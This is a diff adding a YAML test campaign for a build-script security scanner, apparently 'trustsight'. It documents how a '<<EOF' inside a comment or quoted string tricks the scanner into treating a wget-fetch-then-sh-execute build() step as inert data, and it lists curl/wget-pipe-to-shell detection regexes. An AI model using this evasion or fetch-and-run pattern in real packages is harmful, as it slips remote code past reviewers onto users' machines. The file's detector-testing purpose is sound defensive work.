@@ -1,0 +1,76 @@
+campaign: phantom-heredoc-opener
+campaign_type: deterministic
+package: harness-baseline
+
+environment:
+  trustsight_version: 0.18.1
+  trustsight_source: local-path
+  db_state: cold
+  flag_threshold: 20
+
+generator:
+  type: inputs
+
+prompt:
+  prompt_id: phantom-heredoc-opener
+  behavior_goal: fetch_then_execute
+  text: |
+    A comment - or a quoted string - containing `<<EOF`, above a fetch and an
+    execution:
+
+        build() {
+          cd "$srcdir/harness-baseline-1.0.0"
+          # upstream uses the <<EOF redirection form
+          cat > "$srcdir/urls" <<'URLS'
+        https://github.com/example/harness-baseline/raw/main/setup
+        URLS
+          wget -q -i "$srcdir/urls" -P "$srcdir"
+          sh "$srcdir"/setup
+          make
+        }
+
+    `wget -i` reads its addresses from a file, so no URL is on the client's
+    line and H016 has nothing to attribute.  What silences the rest is the
+    comment.  `delivery._heredoc_body_indices` (delivery.py:479-490) scans
+    each resolved line for `_HEREDOC_OPEN_RE` (delivery.py:395) after stripping
+    only a leading `+`/`-`.  It does not test whether the `<<` is inside a
+    comment or inside quotes, so the comment pushes a delimiter, and every
+    following line is recorded as heredoc body - i.e. as data.
+
+    That single classification switches off H069 and H072 (delivery.py:1239),
+    H082 (delivery.py:1609), H083 (delivery.py:1793), H067 and H066, plus the
+    persistence and composition passes that consult the same set.  The control
+    is the same recipe with the comment deleted: H082 pairs the fetch with the
+    execution and the score goes from 5 to 45.
+
+    Two things make this a reader disagreement rather than a loose regex.
+    `line_lex._scan` (line_lex.py:243-252) tests `_opens_a_comment` first and
+    only looks for `<<` outside quotes, so the scope lexer sees one file and
+    the payload scanner sees another.  And `delivery.py:484-487` skips the
+    opener scan for lines that are already a heredoc body, so the trick has to
+    sit outside a real heredoc - `CTL-03-real-heredoc-body` shows that shape
+    scoring 30, not 5.
+
+    `02-quoted-opener-wget-then-sh` needs no comment at all: `note "the <<EOF
+    form is what upstream uses"` is an ordinary message line.  `R010`/`R011`
+    are the floor for naming curl or wget in a function body, so
+    `03-comment-opener-aria2c-then-sh`, which fetches with aria2c, scores 0.
+
+    The scanner has no scope requirement, so the classification applies to a
+    fetch in prepare() as readily as one in build(); that variant is not a
+    cell here because the campaign's template cannot express a second function
+    without losing the single-hunk property the diff reconstruction needs.
+  expected_rules:
+  - H016
+  - H069
+  - H072
+  - H082
+  - H083
+  forbidden_techniques:
+    curl_pipe_to_shell: '(?:\A|[;&|]|\n)\s*curl\b[^|\n]*\|\s*(?:ba|z|da|k)?sh\b'
+    wget_pipe_to_shell: '(?:\A|[;&|]|\n)\s*wget\b[^|\n]*\|\s*(?:ba|z|da|k)?sh\b'
+
+attempts: 11
+
+stop_conditions:
+  bypasses: 9
